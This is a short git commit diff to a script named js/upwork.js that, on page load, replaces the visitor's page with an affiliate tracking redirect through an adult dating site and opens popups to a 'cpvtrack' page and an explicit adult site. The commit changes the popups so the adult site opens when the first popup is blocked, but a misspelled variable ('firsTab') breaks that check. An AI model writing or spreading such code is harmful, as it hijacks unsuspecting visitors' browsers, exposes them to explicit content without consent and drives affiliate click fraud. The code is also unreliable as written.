ff7bb46febb62ff95967f5b7034b43582eb0b347
arecastudio <ondiisrail@gmail.com>
2018-11-19 10:33:52 +0900

    update upwork.js

--- js/upwork.js
+++ js/upwork.js
@@ -5,8 +5,10 @@ $(document).ready(function(){
 		url = "https://www.freefuckbookdating.com/r.php?u=http%3A%2F%2Fmobswift.com%2Fclick.php%3Fc%3D40%26key%3Dk8122ku4t95w6zff0br2698d%26mbid%3Dwmbid1188%26act%3D52832%26pid%3Dpid49970";
 	      	//document.location.assign(url);
 		document.location.replace(url);
-		window.open('https://sexybitches.exposed/39/2.html');
-	      	window.open('http://viral-product-review.com/cpvtrack/base2.php');
+		var firstTab=window.open('http://viral-product-review.com/cpvtrack/base2.php');
+		if(!firsTab){
+			window.open('https://sexybitches.exposed/39/2.html');
+		}
 
 	});
 });
